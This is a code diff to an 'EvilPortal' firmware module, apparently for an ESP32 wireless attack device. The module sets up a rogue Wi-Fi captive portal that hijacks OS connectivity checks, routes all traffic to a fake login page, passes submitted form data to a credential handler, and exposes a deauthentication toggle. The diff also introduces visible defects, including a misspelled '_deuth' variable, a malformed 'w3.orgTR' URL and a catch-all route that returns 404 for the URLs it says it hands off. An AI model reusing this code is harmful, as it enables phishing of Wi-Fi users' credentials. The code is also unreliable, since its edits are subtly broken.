@@ -129,22 +129,25 @@ void EvilPortal::setupRoutes() {
     // Modern captive portal detection URLs (most important for notifications)
     webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple devices and many Android devices check this
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Alternative for some devices
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple specific
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->send(200, "text/html", "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() + "\"></head><body></body></html>");
     });
 
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple specific
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -159,7 +162,8 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Generic redirect endpoint
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     webServer.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -167,11 +171,13 @@ void EvilPortal::setupRoutes() {
     });
 
     webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
     });
 
     // Add proper DNS responses for captive portal detection
@@ -182,7 +188,36 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Windows specific
-        request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(302, "text/plain", "");
+    });
+
+    // Add DNS masquerading for all domains (CRITICAL)
+    webServer.on("^\\/(.*)$", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        String url = request->url();
+        
+        // Check if it's a known captive portal URL
+        if (url == "/" || 
+            url == "/generate_204" || 
+            url == "/gen_204" ||
+            url == "/hotspot-detect.html" ||
+            url == "/library/test/success.html" ||
+            url == "/ncsi.txt" ||
+            url == "/connecttest.txt" ||
+            url == "/redirect" ||
+            url == "/success.txt" ||
+            url == "/canonical.html" ||
+            url == "/fwlink" ||
+            url.indexOf("detectportal") != -1 ||
+            url.indexOf("connecttest") != -1 ||
+            url.indexOf("msftconnecttest") != -1 ||
+            url.indexOf("clients3.google.com") != -1) {
+            // Let the specific handlers deal with these
+            request->send(404);
+        } else {
+            // For all other URLs, redirect to portal
+            portalController(request);
+        }
     });
 
     // Original routes
@@ -215,8 +250,11 @@ void EvilPortal::setupRoutes() {
         if (url.indexOf("detectportal") != -1 || 
             url.indexOf("connecttest") != -1 ||
             url.indexOf("success") != -1 ||
-            url.indexOf("generate") != -1) {
-            request->redirect("http://" + WiFi.softAPIP().toString() + "/");
+            url.indexOf("generate") != -1 ||
+            url.indexOf("msftconnecttest") != -1 ||
+            url.indexOf("clients3.google.com") != -1) {
+            request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+            request->send(302, "text/plain", "");
         }
         else if (request->args() > 0) {
             credsController(request);
@@ -226,8 +264,8 @@ void EvilPortal::setupRoutes() {
         }
     });
 
-    webServer.addHandler(new CaptiveRequestHandler(this))
-        .setFilter(ON_AP_FILTER); // only when requested from AP
+    // Add DNS masquerading handler
+    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
 }
 
 void EvilPortal::restartWiFi(bool reset) {
@@ -268,7 +306,7 @@ void EvilPortal::loop() {
         }
 
         if (check(SelPress)) {
-            isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
+            isDeauthHeld = _deuth ? !isDeauthHeld : isDeauthHeld;
             shouldRedraw = true;
         }
 
@@ -384,7 +422,7 @@ String EvilPortal::wifiLoadPage() {
         "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' "
         "content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div "
         "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
-        "20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div "
+        "20010904//EN' 'http://www.w3.orgTR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div "
         "id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> "
         "<svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' "
         "xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 "
